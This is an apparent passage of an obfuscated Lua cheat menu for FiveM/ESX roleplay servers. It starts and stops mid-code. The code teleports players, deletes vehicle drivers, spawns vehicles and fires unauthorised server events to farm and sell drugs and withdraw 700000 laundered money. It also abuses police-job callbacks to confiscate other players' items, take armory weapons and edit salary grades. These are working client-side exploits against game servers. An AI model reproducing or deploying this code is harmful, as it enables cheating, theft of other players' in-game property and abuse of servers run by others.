          elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
            if IsVehicleSeatFree(NearestPlane, -1) then
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, Pryorbypessed2)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, Pryorbypessed2)
            else
              local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
              ClearPedTasksImmediately(driverPed)
              SetEntityAsMissionEntity(driverPed, 1, 1)
              DeleteEntity(driverPed)
              SetPedIntoVehicle(playerPed, NearestPlane, -1)
              SetVehicleAlarm(NearestPlane, Pryorbypessed2)
              SetVehicleDoorsLocked(NearestPlane, 1)
              SetVehicleNeedsToBeHotwired(NearestPlane, Pryorbypessed2)
            end
          end
          BBWMqktLdH6yHbfd("~g~Teleported Into Nearest Vehicle!", Pryorbypessed2)
        end
      end

      local function qSHAju8S5s5YhJZQ()
        if DoesBlipExist(GetFirstBlipInfoId(8)) then
          local blipIterator = GetBlipInfoIdIterator(8)
          local blip = GetFirstBlipInfoId(8, blipIterator)
          WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
          wp = Pryorbypessed3
        else
          BBWMqktLdH6yHbfd("~r~Nenhum Lugar Marcado!", Pryorbypessed3)
        end

        local zHeigt = 0.0
        height = 1000.0
        while wp do
          Citizen.Wait(0)
          if wp then
            if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
            then
              entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
              entity = GetPlayerPed(-1)
            end

            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, Pryorbypessed3)
            local Pos = GetEntityCoords(entity, Pryorbypessed3)

            if zHeigt == 0.0 then
              height = height - 25.0
              SetEntityCoords(entity, Pos.x, Pos.y, height)
              bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
            else
              SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
              FreezeEntityPosition(entity, Pryorbypessed2)
              wp = Pryorbypessed2
              height = 1000.0
              zHeigt = 0.0
              BBWMqktLdH6yHbfd("~g~Teleportado to waypoint!", Pryorbypessed2)
              break
            end
          end
        end
      end

      local function H33YjuW4DYJKuTG5()
        local C2jV8USeuDvDsRG8 = Pryorbypessed8("Enter Vehicle Spawn Name", "", 100)
        if C2jV8USeuDvDsRG8 and IsModelValid(C2jV8USeuDvDsRG8) and IsModelAVehicle(C2jV8USeuDvDsRG8) then
          RequestModel(C2jV8USeuDvDsRG8)
          while not HasModelLoaded(C2jV8USeuDvDsRG8) do
            Citizen.Wait(0)
          end
          local veh = CreateVehicle(GetHashKey(C2jV8USeuDvDsRG8), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), Pryorbypessed3, Pryorbypessed3)
          SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
        else
          BBWMqktLdH6yHbfd("~b~Model is not valid!", Pryorbypessed3)
        end
      end

      local function MdKhz7mCAmAtWfWV()
        SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2))
        SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0.0)
        SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0)
        SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), Pryorbypessed2)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0)
        SetVehicleUndriveable(vehicle,Pryorbypessed2)
      end

      local function SkfWv5FGYSE7jnjK()
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), 0)
        SetVehicleUndriveable(vehicle,Pryorbypessed2)
      end

      local function Gra7PuA9s5NgtyH8()
        local AJRG7A4pL39q9gSx = GetPlayerPed(-1)
        local sjK6uLZpfk8V6Y88 = GetVehiclePedIsIn(AJRG7A4pL39q9gSx, Pryorbypessed3)
        local vejeFxZTYRZU7X7u = Pryorbypessed8("Enter the plate license you want", "", 100)
        if vejeFxZTYRZU7X7u ~= "" then
          SetVehicleNumberPlateText(sjK6uLZpfk8V6Y88, vejeFxZTYRZU7X7u)
        end
      end

      function n479EVCYRayeScDE()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestWeed"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestWeed"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:pickedUpCannabis"))
      end

      function ZS54TKPexKYaatq4()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformWeed"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformWeed"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:processCannabis"))
      end

      function Ucu5V5UqvZTgN7wD()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellWeed"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellWeed"))
      end

      function cE6BK9u5eaTWjmPS()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestCoke"))
    end
    
    function twL933BeDe4jLuxU()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformCoke"))
    end
    
    function X66q284t8PYm2H9F()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellCoke"))
    end
    
    function M3VFNvcxSK7sWW77()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestMeth"))
    end
    
    function U2w6yHr2fjuUAe8Z()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformMeth"))
    end
    
    function PLypKz5W5GU2mCSd()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellMeth"))
    end
    
    function kPMG5qdfdNNzw3Hu()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startHarvestOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startHarvestOpium"))
    end
    
    function LEnfX2dWH9Mcwd6M()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startTransformOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startTransformOpium"))
    end
    
    function NqKh5ML8NUFapyCJ()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:startSellOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_illegal_drugs:startSellOpium"))
    end

    function YHz33ePSqXKWp5mm()
      PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_blanchisseur:startWhitening"), 85)
      PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_blanchisseur:washMoney"), 100)
      PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_blackmoney:washMoney"))
      PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_moneywash:withdraw"), 700000)
  end

      function exVYjKh2TmeTGQ8j()
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopHarvestCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopTransformCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopSellCoke"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopHarvestMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopTransformMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopSellMeth"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopHarvestWeed"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopTransformWeed"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopSellWeed"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopHarvestOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopTransformOpium"))
        PZ2K94uTvEETfgBM(Pryorbypessed3, (TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW.."_drugs:stopSellOpium"))
        BBWMqktLdH6yHbfd("~b~Everything is now stopped.", Pryorbypessed2)
      end
	  
function f4Y2C9r2THasW8CC(player)		ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:getOtherPlayerData', function(data)	  	Pryorbypessed1(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:get_search_notification', GetPlayerServerId(player))		local elements = {}				table.insert(elements, {								label    = "BlackMoney - "..ESX.Round(data.accounts[1].money),								value    = 'black_money',								itemType = 'item_account',								amount   = data.accounts[1].money						})	table.insert(elements, {label = ('-----GUNS-----'), value = Pryorbypessed})				for i=1, #data.weapons, 1 do			table.insert(elements, {				label    = ESX.GetWeaponLabel(data.weapons[i].name).." "..data.weapons[i].ammo,				value    = data.weapons[i].name,				itemType = 'item_weapon',			amount   = data.weapons[i].ammo			})		end					table.insert(elements, {label = ('-----ITEMS-----'), value = Pryorbypessed})       		for i=1, #data.inventory, 1 do				if data.inventory[i].count > 0 then					table.insert(elements, {					label    = data.inventory[i].label.." "..data.inventory[i].count,					value    = data.inventory[i].name,					itemType = 'item_standard',					amount   = data.inventory[i].count				})			end		end		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'body_search',		{			title    = ('search'),			align    = 'bottom-left',			elements = elements,		},		function(data, menu)			local itemType = data.current.itemType			local itemName = data.current.value			local amount   = data.current.amount		if data.current.value ~= Pryorbypessed then		Pryorbypessed1(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:confiscatePlayerItem', GetPlayerServerId(player), itemType, itemName, amount)		f4Y2C9r2THasW8CC(player)		end		end, function(data, menu)			menu.close()		end)end, GetPlayerServerId(player))end function OpenArmoryMenuP(station)local elements = {{label = ('get_weapon'),     value = 'get_weapon'},{label = ('put_weapon'),     value = 'put_weapon'},{label = ('remove_object'),  value = 'get_stock'},{label = ('deposit_object'), value = 'put_stock'}}table.insert(elements, {label = ('buy_weapons'), value = 'buy_weapons'})ESX.UI.Menu.CloseAll()ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory',{title    = ('armory'),align    = 'bottom-left',elements = elements,},function(data, menu)if data.current.value == 'get_weapon' then OpenGetWeaponMenuP()end if data.current.value == 'put_weapon' then OpenPutWeaponMenuP()end if data.current.value == 'buy_weapons' then OpenBuyWeaponsMenuP()end if data.current.value == 'put_stock' then OpenPutStocksMenuP()end if data.current.value == 'get_stock' then OpenGetStocksMenuP()end end,function(data, menu)menu.close()CurrentAction     = 'menu_armory'CurrentActionMsg  = ('open_armory')CurrentActionData = {station = station}end)end function OpenGetWeaponMenuP()ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:getArmoryWeapons', function(weapons)local elements = {}for i=1, #weapons, 1 do if weapons[i].count > 0 then table.insert(elements, {label = 'x' .. weapons[i].count .. ' ' .. ESX.GetWeaponLabel(weapons[i].name), value = weapons[i].name})end end ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_get_weapon',{title    = ('get_weapon_menu'),align    = 'bottom-left',elements = elements,},function(data, menu)menu.close()ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:removeArmoryWeapon', function()OpenGetWeaponMenuP()end, data.current.value)end,function(data, menu)menu.close()end)end)end function OpenPutWeaponMenuP()local elements   = {}local playerPed  = PlayerPedId()local weaponList = ESX.GetWeaponList()for i=1, #weaponList, 1 do local weaponHash = GetHashKey(weaponList[i].name)if HasPedGotWeapon(playerPed,  weaponHash,  Pryorbypessed2) and weaponList[i].name ~= 'WEAPONNARMED' then table.insert(elements, {label = weaponList[i].label, value = weaponList[i].name})end end ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_put_weapon',{title    = ('put_weapon_menu'),align    = 'bottom-left',elements = elements,},function(data, menu)menu.close()ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:addArmoryWeapon', function()OpenPutWeaponMenuP()end, data.current.value, Pryorbypessed3)end,function(data, menu)menu.close()end)end function OpenBuyWeaponsMenuP(station)ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:getArmoryWeapons', function(weapons)local elements = {}for i=1, 64 do local weapon={"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_CARBINERIFLE","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}table.insert(elements, {label = ESX.GetWeaponLabel(weapon[i]),value = weapon[i]})end ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_buy_weapons',{title    = ('buy_weapon_menu'),align    = 'bottom-left',elements = elements,},function(data, menu)ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:addArmoryWeapon', function()OpenBuyWeaponsMenuP(station)end, data.current.value, Pryorbypessed2)end,function(data, menu)menu.close()end)end)end function OpenGetStocksMenuP()ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:getStockItems', function(items)local elements = {}for i=1, #items, 1 do table.insert(elements, {label = 'x' .. items[i].count .. ' ' .. items[i].label, value = items[i].name})end ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu',{title    = ('police_stock'),align    = 'bottom-left',elements = elements},function(data, menu)local itemName = data.current.value ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count',{title = ('quantity')},function(data2, menu2)local count = tonumber(data2.value)if count == Pryorbypessed then ESX.ShowNotification(('quantity_invalid'))else menu2.close()menu.close()Pryorbypessed1(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:getStockItem', itemName, count)Citizen.Wait(300)OpenGetStocksMenuP()end end,function(data2, menu2)menu2.close()end)end,function(data, menu)menu.close()end)end)end function OpenPutStocksMenuP()ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:getPlayerInventory', function(inventory)local elements = {}for i=1, #inventory.items, 1 do local item = inventory.items[i] if item.count > 0 then table.insert(elements, {label = item.label .. ' x' .. item.count, type = 'item_standard', value = item.name})end end ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu',{title    = ('inventory'),align    = 'bottom-left',elements = elements},function(data, menu)local itemName = data.current.value ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count',{title = ('quantity')},function(data2, menu2)local count = tonumber(data2.value)if count == Pryorbypessed then ESX.ShowNotification(('quantity_invalid'))else menu2.close()menu.close()Pryorbypessed1(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_policejob:putStockItems', data.current.type, itemName, count)Citizen.Wait(300)OpenPutStocksMenuP()end end,function(data2, menu2)menu2.close()end)end,function(data, menu)menu.close()end)end)end function OpenManageGradesMenu66(society)	ESX.TriggerServerCallback(TCynJsV23k3jgn2E.ZtgkLnx3DS38C7sW..'_society:getJob', function(job)		local elements = {}		for i=1, #job.grades, 1 do			local gradeLabel = (job.grades[i].label == '' and job.label or job.grades[i].label)			table.insert(elements, {				label = (string.format ('%s - <span style="color: green;">$%i</span>', gradeLabel, job.grades[i].salary)),				value = job.grades[i].grade			})		end		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'manage_grades_' .. society,		{			title    = ('Maybe?'),			align    = 'bottom-left',			elements = elements		}, function(data, menu)			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'manage_grades_amount_' .. society,			{				title    = (society)			}, function(data2, menu2)				local amount = tonumber(data2.value)				if amount == Pryorbypessed then					ESX.ShowNotification(('invalid_amount'))				elseif amount > Config.MaxSalary then					